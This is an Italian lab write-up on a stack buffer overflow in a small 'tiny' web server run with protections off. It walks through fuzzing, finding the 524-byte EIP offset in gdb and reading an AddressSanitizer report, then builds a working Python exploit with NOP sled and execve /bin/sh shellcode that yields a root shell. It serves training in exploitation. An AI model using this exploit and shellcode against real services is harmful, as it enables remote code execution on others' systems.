# Writeup - stack-buffer-overflow - lab1

Tecniche di exploiting base di vulnerabilità Stack Buffer Overflow like 1996.

```
root@283bf557ebdc:/opt# execnoaslr gdb tiny-lab1
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
...
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$
```
# Discovery

## Fuzzing Manuale

La fase di discovery effettuata tramite il Fuzzing dei parametri ricevuti dal server utilizzando un tool di pattern generation ( https://github.com/rhpco/RHPCOpattern ) risulta utile per identificare il numero di bytes necessari per effettuare overflow.
```
$ curl http://localhost:9999/`python RHPCO-pattern.py generate 500`
File not found%                                                                                
$ curl http://localhost:9999/`python RHPCO-pattern.py generate 550`
curl: (52) Empty reply from server
$ curl http://localhost:9999/`python RHPCO-pattern.py generate 550`

```
- La prima esecuzione risulta ricevere risposta corretta dal webserver.
- La seconda esecuzione risulta ricevere risposta vuota dal webserver indice di mal funzionamento
- La terza esecuzione risulta non ricevere risposta in quanto l'applicazione è risultata andare in Segmentation Fault, dimostrazione dell'avvenuto overflow come mostrato dall'esecuzione del server tramite gdb.

```
root@283bf557ebdc:/opt# execnoaslr gdb tiny-lab1
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
...

gdb-peda$ r
Starting program: /opt/tiny-lab1
listen on port 9999, fd is 3
child pid is 45
[New process 45]
...

[------------------------------------stack-------------------------------------]
0000| 0xffffd320 --> 0xffffd5f8 --> 0xffffd700 --> 0x0
0004| 0xffffd324 --> 0x0
0008| 0xffffd328 --> 0xffffd3f0 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"...)
0012| 0xffffd32c --> 0xf7ed20de (<open+62>:     cmp    eax,0xfffff000)
0016| 0xffffd330 --> 0xf7fc2d80 --> 0xfbad2aa4
0020| 0xffffd334 --> 0x804a67a ("accept request, fd is %d, pid is %d\n")
0024| 0xffffd338 --> 0xffffd354 --> 0x0
[----------------------------------registers-----------------------------------]
EAX: 0x22a
EBX: 0x0
ECX: 0x1
EDX: 0xf7fc3890 --> 0x0
ESI: 0xf7fc2000 --> 0x1d4d6c
EDI: 0x0
EBP: 0x72413372 ('r3Ar')
ESP: 0xffffd600 --> 0x7241 ('Ar')
EIP: 0x35724134 ('4Ar5')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x35724134
[------------------------------------stack-------------------------------------]
0000| 0xffffd600 --> 0x7241 ('Ar')
0004| 0xffffd604 --> 0xffffd750 --> 0xfc820002
0008| 0xffffd608 --> 0xffffd63c --> 0x10
0012| 0xffffd60c --> 0xf7ffdc44 --> 0xf7ffdc30 --> 0xf7fd4000 (jg     0xf7fd4047)
0016| 0xffffd610 --> 0x380
0020| 0xffffd614 --> 0x8048581 ("__libc_start_main")
0024| 0xffffd618 --> 0x380
0028| 0xffffd61c --> 0x380
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x35724134 in ?? ()
```
Identificato il Segmentation Fault avvenuto tramite l'iniziezione del payload generato dal tool `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag...` si può effettuare il calcolo dello spazio disponibile, cioè la distanza tra buffer vulnerabile nel quale è effettuato l'overflow, e il registro `Instruction Pointer EIP`.

Quindi dato l'errore:
```
0x080498d4 in log_access (status=0x194, c_addr=0x72413772, req=0xffffd3f0) at tiny.c:303
303         printf("%s:%d %d - %s\n", inet_ntoa(c_addr->sin_addr),
```
Si noti come il valore del registro `EIP` coincide con `EIP: 0x35724134 ('4Ar5')` cioè i `4bytes` identificati come `4Ar5` che corrispondono ai ultimi 4 bytes della seguente dimensione di bytes iniettati:
```
$ python ../RHPCOpattern/RHPCOpattern.py search 0x35724134
Pattern 0x35724134 found at position 524
```
Pertanto si hanno a disposizione `524 bytes` da utilizzare come payload d'attacco.

Si può approfondire l'analisi effettuando il fuzzing usando i caratteri `A (x41)` e `B (x42)` lo scopo è quello di capire quanti byte di `Offset` servono per sovrascrivere i `4 byte` del registro `EIP`.
Eseguendo ad esempio:
```
curl http://localhost:9999/`python -c 'print "A"*524+"BBBB"'`
```
Otteniamo esatamente quanto atteso, cioè i 4 byte del carattere `B` sovrascrivono esattamente i 4byte del registro `EIP`.
```
[----------------------------------registers-----------------------------------]
EAX: 0x228
EBX: 0x0
ECX: 0x1
EDX: 0xf7fc3890 --> 0x0
ESI: 0xf7fc2000 --> 0x1d4d6c
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd600 --> 0x0
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd600 --> 0x0
0004| 0xffffd604 --> 0xffffd750 --> 0x36830002
0008| 0xffffd608 --> 0xffffd63c --> 0x10
0012| 0xffffd60c --> 0xf7ffdc44 --> 0xf7ffdc30 --> 0xf7fd4000 (jg     0xf7fd4047)
0016| 0xffffd610 --> 0x380
0020| 0xffffd614 --> 0x8048581 ("__libc_start_main")
0024| 0xffffd618 --> 0x380
0028| 0xffffd61c --> 0x380
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```
## Address Sanitizer
Compilare il server tramite il flag `-fsanitize=address -g` come eseguido dal Makefile:

```
root@283bf557ebdc:/opt# make addressanitizer
```
Ed eseguire il webserver:
```
root@283bf557ebdc:/opt# execnoaslr ./tiny-lab1-addressanitizer
listen on port 9999, fd is 3
child pid is 132

```

Effettuare il semplice Fuzzing della URL richiesta e verificare il crash del server con i dettagli forniti dall'instrumentation in fase di compilazione dell'addresssanitizer.
Fuzzing:
```
$ curl http://localhost:9999/`python -c 'print "A"*600'`           
curl: (52) Empty reply from server
```
E di seguito Address Sanitizer Output a seguito del crash:
```
accept request, fd is 4, pid is 131
=================================================================
==131==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffd2d8 at pc 0x08182515 bp 0xffffbc48 sp 0xffffbc3c
WRITE of size 1 at 0xffffd2d8 thread T0
    #0 0x8182514  (/opt/tiny-lab1-addressanitizer+0x8182514)
    #1 0x8182e08  (/opt/tiny-lab1-addressanitizer+0x8182e08)
    #2 0x8183e60  (/opt/tiny-lab1-addressanitizer+0x8183e60)
    #3 0x8184bdc  (/opt/tiny-lab1-addressanitizer+0x8184bdc)
    #4 0xf7ceee80  (/lib32/libc.so.6+0x18e80)
    #5 0x8060b01  (/opt/tiny-lab1-addressanitizer+0x8060b01)

Address 0xffffd2d8 is located in stack of thread T0 at offset 536 in frame
    #0 0x8183cef  (/opt/tiny-lab1-addressanitizer+0x8183cef)

  This frame has 2 object(s):
    [16, 536) 'req' (line 348) <== Memory access at offset 536 overflows this variable
    [672, 760) 'sbuf' (line 351)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/opt/tiny-lab1-addressanitizer+0x8182514)
Shadow bytes around the buggy address:
  0x3ffffa00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ffffa10: 00 00 00 00 00 00 00 00 f1 f1 00 00 00 00 00 00
  0x3ffffa20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ffffa30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ffffa40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x3ffffa50: 00 00 00 00 00 00 00 00 00 00 00[f2]f2 f2 f2 f2
  0x3ffffa60: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f8 f8 f8 f8
  0x3ffffa70: f8 f8 f8 f8 f8 f8 f8 f3 f3 f3 f3 f3 00 00 00 00
  0x3ffffa80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ffffa90: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 00 00
  0x3ffffaa0: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==131==ABORTING
```

## Construction
A questo punto a seguito dell'analisi manuale sappiamo che abbiamo la possibilità di utilizzare `524+4` bytes per initettare il nostro `Shellcode`.

Visualizzando lo stato dello stack tramite il seguente comando `x/200x $esp-600`
che significa:
- fammi vedere 200 indirizzi in formato hex partendo da `$esp-600`, infatti il valore di `$esp` risulta essere ( ricordandoci che stack cresce verso il basso ) otteniamo:
```
gdb-peda$ x/200x $esp-600
0xffffd3a8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3b8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3c8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3d8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3e8:     0x00000000      0x00000000      0x41414141      0x41414141
0xffffd3f8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd408:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd418:     0x41414141      0x41414141      0x41414141      0x41414141
[...]
0xffffd5b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5e8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5f8:     0x41414141      0x42424242      0x00000000      0xffffd750
0xffffd608:     0xffffd63c      0xf7ffdc44    
```
Quindi sappiamo che l'indirizzo e il valore dello `Stack Pointer ESP` risultano essere:
```
(gdb) x/x $esp
0xffffcb30:     0x00000000
```
Di conseguenza che l'indirizzo e il valore dell' `Instruction Pointer EIP` risultano essere:
```
gdb-peda$ x/x $esp-4
0xffffd5fc:     0x42424242
```
E quindi infatti se contassimo la distanza tra l'indirizzo dove iniziano le `A (0x41)`:
```
gdb-peda$ x/x 0xffffd3e8+8
0xffffd3f0:     0x41414141
```
Ed il registro `EIP` risultano essere proprio `524 bytes:
```
>>> 0xffffd3e8+8-0xffffd5fc
-524
```

## Exploiting

In base agli elementi identificati:
- si hanno a disposizione `524` bytes si spazio per iniettare uno shellcode.
- si può utilizzare la tecnica del `NOP Sleed` per iniettare una serie di `x90` cioè `NOP Codes` che significano `NO OPERATION` in modo da avere bytes che rappresentano codice che non esegue alcunchè con lo scopo di effettuare overwrite del Return Address in questa zona di memoria così da non dover essere estramente precisi nello sovrascrivere il ret address perchè dal momento che si jmpa in tale area l'esecuzione di ogni `NOP` avverebbe 1 alla volta effettuando lo scivolamento verso l'area contenente i bytes dello shellcode e la loro esecuzione.

Quindi l'area di payload exploit risulta essere così:
```
[AAA...AAA] + [NOP...NOP] + SHELLCODE + SHELLCODE Address
```
Il tutto calcolato come segue:
```
PAYLOAD = PADDING*PADDING_SIZE + NOP*(NOP_SIZE/2) + SHELLCODE + OVERWRITE_EIP_WITH_SHELLCODE_ADDRESS
```

### Identificare Return Address

Il corretto `SHELLCODE Address` da usare per sovrascrivere il registro `EIP` verrà scelto tra i valori identificati nello stack contenenti  valori di NOP codes `x90` sfruttando la tenica di `NOP sleed`. 

Tramite il seguente exploit contenente `0x42424242` come indirizzo da sovrascrivere RET address possiamo effettuare l'analisi:

exploit.py
```
import struct
import urllib
SIZE = 524
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
SHELLCODE_SIZE = 25
NOP = "\x90"
NOP_SIZE = 100
PADDING = "\x41"
PADDING_SIZE = SIZE - SHELLCODE_SIZE - NOP_SIZE
EIP = struct.pack("I", 0x42424242)
PAYLOAD = PADDING*PADDING_SIZE + NOP*NOP_SIZE + SHELLCODE + EIP
print urllib.quote_plus(PAYLOAD)
```

Eseguito nel seguente modo:
```
$ curl http://localhost:9999/`python exploit.py`

```
Verso il server eseguito in tramite gdb come segue:
```
root@283bf557ebdc:/opt# execnoaslr gdb tiny-lab1
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
[...]
gdb-peda$ r
Starting program: /opt/tiny-lab1
listen on port 9999, fd is 3
child pid is 185
[New process 185]
accept request, fd is 4, pid is 181
HTTP/1.1 404 Not found
Content-length: 14

File not found172.17.0.1:34438 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S��
[...]
[----------------------------------registers-----------------------------------]
EAX: 0x228
EBX: 0x0
ECX: 0x1
EDX: 0xf7fc3890 --> 0x0
ESI: 0xf7fc2000 --> 0x1d4d6c
EDI: 0x0
EBP: 0x80cd0bb0
ESP: 0xffffd600 --> 0x0
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd600 --> 0x0
0004| 0xffffd604 --> 0xffffd750 --> 0x8a860002
0008| 0xffffd608 --> 0xffffd63c --> 0x10
0012| 0xffffd60c --> 0xf7ffdc44 --> 0xf7ffdc30 --> 0xf7fd4000 (jg     0xf7fd4047)
0016| 0xffffd610 --> 0x380
0020| 0xffffd614 --> 0x8048581 ("__libc_start_main")
0024| 0xffffd618 --> 0x380
0028| 0xffffd61c --> 0x380
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

Analizzando lo stack a seguito del crash atteso si verifica la presenza dei bytes di padding contenente `A (0x41)`, successivamente il `NOP sleed` che inizia dal seguente indirizzo `0xffffd57c`:
```
gdb-peda$ x/x 0xffffd578+4
0xffffd57c:     0x90414141
```
Dallo stack completo si nota il valore `0x42424242` sovrascritto nell'indirizzo `0xffffd5f8+4` cioè `0xffffd5fc`, così calcolato:
```
gdb-peda$ x/x 0xffffd5f8+4
0xffffd5fc:     0x42424242
```
Stack completo
```
gdb-peda$ x/200x $esp-200
0xffffd538:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd548:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd558:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd568:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd578:     0x41414141      0x90414141      0x90909090      0x90909090
0xffffd588:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd598:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd5a8:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd5b8:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd5c8:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd5d8:     0x90909090      0x90909090      0x31909090      0x2f6850c0
0xffffd5e8:     0x6868732f      0x6e69622f      0x8950e389      0xe18953e2
0xffffd5f8:     0x80cd0bb0      0x42424242      0x00000000      0xffffd750
0xffffd608:     0xffffd63c      0xf7ffdc44      0x00000380      0x08048581
0xffffd618:     0x00000380      0x00000380      0xf7fdf289   
[..]

```

A questo punto risulta evidente come possiamo scegliere un indirizzo dello stack qualsiasi di questa prima zona di `NOP Codes` come ad esempio `0xffffd588`. 
Questo sarà il valore che useremo per effettuare overwrite del `EIP` nell'exploit, che iniziando l'esecuzione su l'indirizzo puntato da tale registro tornerà indietro fino l'inizio dello shellcode cioè dall'indirizzo `0xffffd5e3` calcolato come segue:
```
gdb-peda$ x/4b 0xffffd5d8+11
0xffffd5e3:     0x31    0xc0    0x50    0x68
```
che rappresentano esattamente l'inizio dello shellcode iniettato:
```
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```
Grazie allo scivolamento (sleed), cioè l'esecuzione di tutti i `NOP Codes` che si trovano tra l'indirizzo `0xffffd588` e `0xffffd5e3`

Di seguito exploit aggiornato con indirizzo:

exploit.py
```
import struct
import urllib
SIZE = 524
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
SHELLCODE_SIZE = 25
NOP = "\x90"
NOP_SIZE = 100
PADDING = "\x41"
PADDING_SIZE = SIZE - SHELLCODE_SIZE - NOP_SIZE
EIP = struct.pack("I", 0xffffd5a4)
PAYLOAD = PADDING*PADDING_SIZE + NOP*(NOP_SIZE/2) + SHELLCODE + NOP*(NOP_SIZE/2)+ EIP
print urllib.quote_plus(PAYLOAD)
```
(il secondo NOP sleed risulta utile nel seguente scenario ma non essenziale)
Eseguito tramite:
```
curl http://localhost:9999/`python exploit.py`
```

Di seguito la dimostrazione finale della fase di exploiting
```
gdb-peda$ r
Starting program: /opt/tiny-lab1
listen on port 9999, fd is 3
[New process 248]
child pid is 248
accept request, fd is 4, pid is 247
HTTP/1.1 404 Not found
Content-length: 14

File not found172.17.0.1:34820 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������1�Ph//shh/bin��P��S��
 ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀������������������������������������������������������
# uname -a
Linux 283bf557ebdc 4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
#

```


// rhpco